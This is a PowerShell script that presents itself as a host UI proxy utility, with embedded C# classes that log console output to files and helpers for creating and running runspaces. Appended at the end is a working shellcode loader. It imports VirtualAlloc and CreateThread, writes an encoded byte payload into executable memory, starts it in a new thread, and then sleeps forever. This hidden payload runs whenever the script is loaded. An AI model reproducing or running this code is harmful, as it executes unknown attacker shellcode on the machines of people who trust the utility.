

if($PSEdition -eq 'Core')
{
    Write-Verbose 'uiProxy is not supported on PowerShell Core Edition'
    return
}

$source = @"
using System;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Automation.Host;

namespace HostUIProxy
{
    public class HostProxy : System.Management.Automation.Host.PSHost
    {
        private System.Management.Automation.Host.PSHost realHost;
        private System.Management.Automation.Host.PSHostUserInterface uiProxy;

        public HostProxy(System.Management.Automation.Host.PSHost realHost, string filePath, int sessionCount)
        {
            this.realHost = realHost;
            uiProxy = new HostUIProxy(realHost.UI, filePath, sessionCount);
        }

        public override System.Globalization.CultureInfo CurrentCulture
        {
            get { return realHost.CurrentCulture; }
        }

        public override System.Globalization.CultureInfo CurrentUICulture
        {
            get { return realHost.CurrentUICulture; }
        }

        public override void EnterNestedPrompt()
        {
            realHost.EnterNestedPrompt();
        }

        public override void ExitNestedPrompt()
        {
            realHost.ExitNestedPrompt();
        }

        public override Guid InstanceId
        {
            get { return realHost.InstanceId; }
        }

        public override string Name
        {
            get { return realHost.Name; }
        }

        public override void NotifyBeginApplication()
        {
            realHost.NotifyBeginApplication();
        }

        public override void NotifyEndApplication()
        {
            realHost.NotifyEndApplication();
        }

        public override void SetShouldExit(int exitCode)
        {
            realHost.SetShouldExit(exitCode);
        }

        public override System.Management.Automation.Host.PSHostUserInterface UI
        {
            get { return uiProxy; }
        }

        public override Version Version
        {
            get { return realHost.Version; }
        }
    }

    public class HostUIProxy : System.Management.Automation.Host.PSHostUserInterface
    {
        private string filePath = string.Empty;
        private int choiceToMake = 0;
        private int sessionCount = 1;
        private System.Management.Automation.Host.PSHostUserInterface realUI;

        public HostUIProxy(System.Management.Automation.Host.PSHostUserInterface realUI, string filePath, int sessionCount)
        {
            this.filePath = filePath;
            this.realUI = realUI;
            this.sessionCount = sessionCount;
        }

        public int ChoiceToMake
        {
            get { return choiceToMake; }
            set { choiceToMake = value; }
        }

        public override Dictionary<string, System.Management.Automation.PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<System.Management.Automation.Host.FieldDescription> descriptions)
        {
            return realUI.Prompt(caption, message, descriptions);
        }

        public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<System.Management.Automation.Host.ChoiceDescription> choices, int defaultChoice)
        {
            WriteToFile(this.filePath, message,"PromptForChoice");
            return ChoiceToMake;
            //return realUI.PromptForChoice(caption, message, choices, defaultChoice);
        }

        public override System.Management.Automation.PSCredential PromptForCredential(string caption, string message, string userName, string targetName, System.Management.Automation.PSCredentialTypes allowedCredentialTypes, System.Management.Automation.PSCredentialUIOptions options)
        {
            return realUI.PromptForCredential(caption, message, userName, targetName, allowedCredentialTypes, options);
        }

        public override System.Management.Automation.PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
        {
            return realUI.PromptForCredential(caption, message, userName, targetName);
        }

        public override System.Management.Automation.Host.PSHostRawUserInterface RawUI
        {
            get { return realUI.RawUI; }
        }

        public override string ReadLine()
        {
            return realUI.ReadLine();
        }

        public override System.Security.SecureString ReadLineAsSecureString()
        {
            return realUI.ReadLineAsSecureString();
        }

        public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
        {
            WriteToFile(this.filePath, value,"writewithcolor");
            //realUI.Write(foregroundColor, backgroundColor, value);
        }

        public override void Write(string value)
        {
            WriteToFile(this.filePath, value,"write");
            //realUI.Write(value);
        }

        public override void WriteDebugLine(string message)
        {
            WriteToFile(this.filePath, message, "WriteDebugLine");
            //realUI.WriteDebugLine(message);
        }

        public override void WriteErrorLine(string value)
        {
            WriteToFile(this.filePath, value, "WriteErrorLine");
            //realUI.WriteErrorLine(value);
        }

        public override void WriteLine(string value)
        {
            WriteToFile(this.filePath, value, "WriteLine");
            //realUI.WriteLine(value);
        }

        public override void WriteProgress(long sourceId, System.Management.Automation.ProgressRecord record)
        {
            WriteToFile(this.filePath, record.ToString(), "WriteProgress");
            //realUI.WriteProgress(sourceId, record);
        }

        public override void WriteVerboseLine(string message)
        {
            WriteToFile(this.filePath, message, "WriteVerboseLine");
            //realUI.WriteVerboseLine(message);
        }

        public override void WriteWarningLine(string message)
        {
            WriteToFile(this.filePath, message, "WriteWarningLine");
            //realUI.WriteWarningLine(message.ToUpper());
        }

        private void WriteToFile(string filePath, string message,string type)
        {
           // Validate filepath parameter.          
           // handle null value.
           if (filePath == null)
           {
              throw new ArgumentNullException("filePath cannot be null");
           }
           // handle empty value. 
           if (filePath.Length == 0)
           {
             throw new ArgumentException("filePath cannot be empty");
           }
            
            try
            {

                if (!System.IO.Directory.Exists(filePath))
                {
                    System.IO.Directory.CreateDirectory(filePath);
                }
                for (int i = 0; i < sessionCount; i++)
                {
                    string tempFileName = System.IO.Path.Combine(filePath, (string.Concat(string.Format("{0}-{1}.txt",type,i))));
  
                    System.IO.File.AppendAllText(tempFileName, message.Trim());
                }
            }
            finally
            {
                GC.Collect();
            }
        }
    }
}
"@

Function CreateRunSpace($filePath,$sessionCount)
{
    if ([Type]::GetType('HostUIProxy.HostProxy',$false) -eq $null)
    {
    	add-type -TypeDefinition $source -language CSharp 
    }
    $Global:proxy = new-object HostUIProxy.HostProxy($host,$filePath,$sessionCount)

    $runspace = [Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace($proxy)
    $runspace.Open()

    return $runspace
}

Function ExecuteCommand
{
    [CmdletBinding()]
    param($runspace, $command)

    if($runspace -ne $null)
    {
        $pipe =  $runspace.CreatePipeline($command)

        $pipe.invoke()  
        
        if ($pipe.HadErrors)
        {
            $pipe.Error.ReadToEnd() | write-error
        } 
    }
}

Function CloseRunSpace($runspace)
{
    if($runspace -ne $null)
    {
        $runspace.Close()
    }
}




$hTJ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $hTJ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xb8,0x53,0x43,0x31,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xb7,0xb1,0xb6,0xcd,0x2f,0xb7,0x39,0x2e,0xaf,0xd8,0xb0,0xcb,0x9e,0xd8,0xa7,0x98,0xb0,0xe8,0xac,0xcd,0x3c,0x82,0xe1,0xe5,0xb7,0xe6,0x2d,0x09,0x70,0x4c,0x08,0x24,0x81,0xfd,0x68,0x27,0x01,0xfc,0xbc,0x87,0x38,0xcf,0xb0,0xc6,0x7d,0x32,0x38,0x9a,0xd6,0x38,0xef,0x0b,0x53,0x74,0x2c,0xa7,0x2f,0x98,0x34,0x54,0xe7,0x9b,0x15,0xcb,0x7c,0xc2,0xb5,0xed,0x51,0x7e,0xfc,0xf5,0xb6,0xbb,0xb6,0x8e,0x0c,0x37,0x49,0x47,0x5d,0xb8,0xe6,0xa6,0x52,0x4b,0xf6,0xef,0x54,0xb4,0x8d,0x19,0xa7,0x49,0x96,0xdd,0xda,0x95,0x13,0xc6,0x7c,0x5d,0x83,0x22,0x7d,0xb2,0x52,0xa0,0x71,0x7f,0x10,0xee,0x95,0x7e,0xf5,0x84,0xa1,0x0b,0xf8,0x4a,0x20,0x4f,0xdf,0x4e,0x69,0x0b,0x7e,0xd6,0xd7,0xfa,0x7f,0x08,0xb8,0xa3,0x25,0x42,0x54,0xb7,0x57,0x09,0x30,0x74,0x5a,0xb2,0xc0,0x12,0xed,0xc1,0xf2,0xbd,0x45,0x4e,0xbe,0x36,0x40,0x89,0xc1,0x6c,0x34,0x05,0x3c,0x8f,0x45,0x0f,0xfa,0xdb,0x15,0x27,0x2b,0x64,0xfe,0xb7,0xd4,0xb1,0x6b,0xbd,0x42,0xad,0x71,0x63,0xfd,0xb9,0x8b,0x9b,0x10,0x66,0x05,0x7d,0x42,0xc6,0x45,0xd2,0x22,0xb6,0x25,0x82,0xca,0xdc,0xa9,0xfd,0xea,0xde,0x63,0x96,0x80,0x30,0xda,0xce,0x3c,0xa8,0x47,0x84,0xdd,0x35,0x52,0xe0,0xdd,0xbe,0x51,0x14,0x93,0x36,0x1f,0x06,0x43,0xb7,0x6a,0x74,0xc5,0xc8,0x40,0x13,0xe9,0x5c,0x6f,0xb2,0xbe,0xc8,0x6d,0xe3,0x88,0x56,0x8d,0xc6,0x83,0x5f,0x1b,0xa9,0xfb,0x9f,0xcb,0x29,0xfb,0xc9,0x81,0x29,0x93,0xad,0xf1,0x79,0x86,0xb1,0x2f,0xee,0x1b,0x24,0xd0,0x47,0xc8,0xef,0xb8,0x65,0x37,0xc7,0x66,0x95,0x12,0xd9,0x5b,0x40,0x5a,0xaf,0xb5,0x50;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$EEJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($EEJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$EEJ,0,0,0);for (;;){Start-sleep 60};

